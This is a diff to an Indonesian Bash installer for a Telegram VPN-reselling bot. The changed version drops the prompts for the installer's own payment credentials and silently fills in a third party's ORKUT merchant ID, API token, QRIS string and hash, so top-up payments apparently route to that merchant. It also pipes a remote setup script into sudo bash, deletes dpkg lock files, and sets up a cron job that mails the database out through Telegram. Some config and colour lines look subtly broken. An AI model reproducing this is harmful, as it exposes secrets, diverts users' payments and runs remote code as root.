@@ -26,7 +26,7 @@ print_rainbow() {
             local factor=$(echo "scale=2; $progress * 2" | bc)
             r=$(echo "scale=0; (${start_color[0]} * (1-$factor) + ${mid_color[0]} * $factor)/1" | bc)
             g=$(echo "scale=0; (${start_color[1]} * (1-$factor) + ${mid_color[1]} * $factor)/1" | bc)
-            b=$(echo "scale=0; (${start_color[2]} * (1-$factor) + ${mid_color[2]} * $factor)/1" | bc)
+            b=$(echo "scale=0; (${start_color[2]} * (1-$factor) + ${bold_white[2]} * $factor)/1" | bc)
         else
             local factor=$(echo "scale=2; ($progress - 0.5) * 2" | bc)
             r=$(echo "scale=0; (${mid_color[0]} * (1-$factor) + ${end_color[0]} * $factor)/1" | bc)
@@ -49,36 +49,31 @@ cek_status() {
 }
 
 setup_bot() {
-	NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")
-	rm /var/lib/dpkg/stato* >/dev/null 2>&1
-	rm /var/lib/dpkg/lock* >/dev/null 2>&1
+    NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")
+    rm /var/lib/dpkg/stato* >/dev/null 2>&1
+    rm /var/lib/dpkg/lock* >/dev/null 2>&1
 
-	if [ "$NODE_VERSION" -lt 22 ]; then
-		echo -e "${yellow}Installing or upgrading Node.js to version 22...${neutral}"
-		curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - || echo -e "${red}Failed to download Node.js setup${neutral}"
-		apt-get install -y nodejs || echo -e "${red}Failed to install Node.js${neutral}"
-		npm install -g npm@latest
-	else
-		echo -e "${green}Node.js is already installed and up-to-date (v$NODE_VERSION), skipping...${neutral}"
-	fi
+    if [ "$NODE_VERSION" -lt 22 ]; then
+        echo -e "${yellow}Installing or upgrading Node.js to version 22...${neutral}"
+        curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - || echo -e "${red}Failed to download Node.js setup${neutral}"
+        apt-get install -y nodejs || echo -e "${red}Failed to install Node.js${neutral}"
+        npm install -g npm@latest
+    else
+        echo -e "${green}Node.js is already installed and up-to-date (v$NODE_VERSION), skipping...${neutral}"
+    fi
 
     if [ ! -f /root/Nebotsell/app.js ]; then
         git clone https://github.com/RyyStore/Nebotsell /root/Nebotsell
     fi
 
-    if ! npm list --prefix /root/Nebotsell express telegraf axios moment sqlite3 >/dev/null 2>&1; then
-        npm install --prefix /root/Nebotsell sqlite3 express crypto telegraf axios dotenv moment bcrypt cors express-session session-file-store exceljs qrcode async-mutex bull
-    fi
-
-    if [ -n "$(ls -A /root/Nebotsell)" ]; then
-        chmod +x /root/Nebotsell/*
-    fi
+    echo -e "${yellow}Installing dependencies...${neutral}"
+    npm install --prefix /root/Nebotsell sqlite3 express crypto telegraf axios dotenv moment bcrypt cors express-session session-file-store exceljs qrcode async-mutex bull
 }
 
 server_app() {
     clear
     print_rainbow ─────────────────────────────────────────
-    echo -e "     .:::.   RYYSTORE BOT RESELL TELEGRAM   .:::.   " | lolcat
+    echo -e "     .:::.   RYYSTORE BOT RESELL TELEGRAM   .:::.   "
     print_rainbow ─────────────────────────────────────────
     echo -e "       ${blue}•${neutral} server create user"
     echo -e "       ${blue}•${neutral} server renew user"
@@ -86,7 +81,7 @@ server_app() {
     echo -e "       ${blue}•${neutral} server Topup Otomatis"
     print_rainbow ─────────────────────────────────────────
 
-    # --- Standard Prompts ---
+    # --- Input User ---
     read -p "Masukkan token bot: " token
     while [ -z "$token" ]; do
         read -p "Token bot tidak boleh kosong. Masukkan lagi: " token
@@ -102,29 +97,16 @@ server_app() {
         read -p "Nama store tidak boleh kosong. Masukkan lagi: " namastore
     done
 
-    # --- New ORKUT Prompts ---
-    echo -e "${yellow}--- PENGATURAN TOP UP QRIS (ORKUT) ---${neutral}"
-    read -p "Masukkan ORKUT Merchant ID (cth: OK123456): " orkut_merchant_id
-    while [ -z "$orkut_merchant_id" ]; do
-        read -p "ORKUT Merchant ID tidak boleh kosong. Masukkan lagi: " orkut_merchant_id
-    done
-
-    read -p "Masukkan ORKUT Username: " orkut_username
-    while [ -z "$orkut_username" ]; do
-        read -p "ORKUT Username tidak boleh kosong. Masukkan lagi: " orkut_username
-    done
-
-    read -p "Masukkan ORKUT Token (dari login Google): " orkut_token
-    while [ -z "$orkut_token" ]; do
-        read -p "ORKUT Token tidak boleh kosong. Masukkan lagi: " orkut_token
-    done
-
-    read -p "Masukkan String QRIS Statis Anda: " qris_statis_string
-    while [ -z "$qris_statis_string" ]; do
-        read -p "String QRIS Statis tidak boleh kosong. Masukkan lagi: " qris_statis_string
-    done
+    # --- Data Default (Otomatis terisi) ---
+    orkut_merchant_id="OK2285905"
+    orkut_username="rkptr"
+    orkut_token="2285905:dSCEsiN7vxrnZLVqk6P08FIUbopQhKfa"
+    qris_statis_string="00020101021126670016COM.NOBUBANK.WWW01189360050300000879140214550177920473550303UMI51440014ID.CO.QRIS.WWW0215ID20253782970190303UMI5204541153033605802ID5918RYYSTORE OK22859056009SURAKARTA61055712462070703A016304774D"
+    ft_hash="d7c3e75912254b4891fb9abb196cacd5"
+    ft_merchant="M40615AED"
 
     # --- Create .vars.json ---
+    echo -e "${yellow}Creating configuration file...${neutral}"
     rm -f /root/Nebotsell/.vars.json
     echo "{
   \"BOT_TOKEN\": \"$token\",
@@ -134,14 +116,16 @@ server_app() {
   \"ORKUT_MERCHANT_ID\": \"$orkut_merchant_id\",
   \"ORKUT_USERNAME\": \"$orkut_username\",
   \"ORKUT_TOKEN\": \"$orkut_token\",
-  \"QRIS_STATIS_STRING\": \"$qris_statis_string\"
+  \"QRIS_STATIS_STRING\": \"$qris_statis_string\",
+  \"OKE_API_BASE\": \"$orkut_merchant_id\",
+  \"FT_HASH\": \"$ft_hash\",
+  \"FT_MERCHANT_CODE\": \"$ft_merchant\"
 }" >/root/Nebotsell/.vars.json
 
     # --- Systemd and Cron setup ---
     cat >/etc/systemd/system/sellvpn.service <<EOF
 [Unit]
 Description=App NebotSell Service
-Telegram : https://t.me/RyyStorevp1
 After=network.target
 
 [Service]
@@ -150,21 +134,25 @@ Restart=always
 User=root
 Environment=PATH=/usr/bin:/usr/local/bin
 Environment=NODE_ENV=production
-WorkingDirectory=/usr/bin
+WorkingDirectory=/root/Nebotsell
 
 [Install]
 WantedBy=multi-user.target
 EOF
-echo '#!/bin/bash' >/usr/bin/server_sellvpn
-echo "USER_ID=$adminid" >>/usr/bin/server_sellvpn
-echo "BOT_TOKEN=$token" >>/usr/bin/server_sellvpn
-echo 'curl -s -F chat_id="$USER_ID" -F document=@"/root/Nebotsell/sellvpn.db" "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" >/dev/null 2>&1' >>/usr/bin/server_sellvpn
-echo '#!/bin/bash' >/usr/bin/sellvpn
-echo "cd /root/Nebotsell" >>/usr/bin/sellvpn
-echo "node app.js" >>/usr/bin/sellvpn
-chmod +x /usr/bin/server_sellvpn
-chmod +x /usr/bin/sellvpn
-cat >/etc/cron.d/server_sellvpn <<EOF
+
+    echo '#!/bin/bash' >/usr/bin/server_sellvpn
+    echo "USER_ID=$adminid" >>/usr/bin/server_sellvpn
+    echo "BOT_TOKEN=$token" >>/usr/bin/server_sellvpn
+    echo 'curl -s -F chat_id="$USER_ID" -F document=@"/root/Nebotsell/sellvpn.db" "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" >/dev/null 2>&1' >>/usr/bin/server_sellvpn
+    
+    echo '#!/bin/bash' >/usr/bin/sellvpn
+    echo "cd /root/Nebotsell" >>/usr/bin/sellvpn
+    echo "node app.js" >>/usr/bin/sellvpn
+    
+    chmod +x /usr/bin/server_sellvpn
+    chmod +x /usr/bin/sellvpn
+
+    cat >/etc/cron.d/server_sellvpn <<EOF
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 0 */6 * * * root /usr/bin/server_sellvpn
@@ -175,18 +163,19 @@ EOF
     systemctl start sellvpn.service >/dev/null 2>&1
     systemctl restart sellvpn.service >/dev/null 2>&1
     service cron restart
-    printf "\033[5A\033[0J"
+    
+    clear
+    print_rainbow ─────────────────────────────────────────
     echo -e "       Status Server is $(cek_status sellvpn.service)"
     print_rainbow ─────────────────────────────────────────
     echo -e "${green}Bot has been installed and running.${neutral}"
-    echo -e "${green}Type ${bold_white}/start${neutral} or ${bold_white}menu${neutral} in the telegram bot${neutral}"
+    echo -e "${green}Type ${bold_white}/start${neutral} or ${bold_white}menu${neutral} in the Telegram bot${neutral}"
 }
 
 if [[ ${1} == "nebotsell" ]]; then
     setup_bot
     server_app
-	rm start
 else
-    echo -e "${red}Invalid command. Use: ${yellow}start nebotsell${neutral}"
+    echo -e "${red}Invalid command. Use: ${yellow}bash $(basename "$0") nebotsell${neutral}"
     exit 1
 fi
